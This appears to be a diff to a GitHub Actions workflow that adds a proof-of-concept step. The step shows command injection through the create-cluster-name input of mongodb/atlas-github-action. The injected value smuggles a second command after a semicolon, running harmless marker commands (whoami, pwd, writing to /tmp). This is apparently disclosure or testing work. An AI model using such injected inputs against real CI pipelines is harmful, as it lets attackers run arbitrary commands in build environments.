@@ -15,10 +15,11 @@ jobs:
 
       - name: POC - Command Injection via create-cluster-name
         uses: mongodb/atlas-github-action@v0.2.0
+        continue-on-error: true
         with:
           # Command injection via create-cluster-name
           # The injected command executes even though atlas command will fail
-          create-cluster-name: "test-cluster; echo '🚨 INJECTION via create-cluster-name 🚨' && echo 'User: '$(whoami) && echo 'PWD: '$(pwd) && touch /tmp/cluster-injection-poc.txt"
+          create-cluster-name: "test-cluster; echo '🚨 INJECTION via create-cluster-name 🚨' > /tmp/cluster-injection-poc.txt && echo 'User:' $(whoami) && echo 'PWD:' $(pwd) && echo 'Date:' $(date) >> /tmp/cluster-injection-poc.txt || true"
           tier: "M0"
           provider: "AWS"
           region: "US_EAST_1"
